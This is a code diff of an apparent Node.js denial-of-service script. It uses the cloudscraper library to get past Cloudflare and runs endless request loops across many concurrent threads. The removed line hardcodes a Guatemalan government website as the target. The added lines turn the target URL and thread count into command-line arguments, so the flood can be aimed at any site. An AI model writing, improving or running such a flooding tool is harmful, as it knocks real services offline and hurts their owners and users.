@@ -1,5 +1,21 @@
+'use strict';
 var cloudscraper = require('cloudscraper');
-const site = "https://www.guatemala.gob.gt";
+
+const args = require('minimist')(process.argv.slice(2));
+
+var site=args['site'];
+var threads=args['threads']
+
+if(typeof site === 'undefined')
+{
+	console.log('Ingresa un url');
+	return;
+}
+if (isNaN(threads))
+{
+	console.log('Ingresa un numero para los threads');
+	return;
+}
 
 let promises = [];
 
@@ -27,6 +43,6 @@ async function infiniteThread() {
   infiniteThread();
 }
 
-for (let index = 0; index < 1000; index++) {
+for (let index = 0; index < threads; index++) {
   infiniteThread();
 }
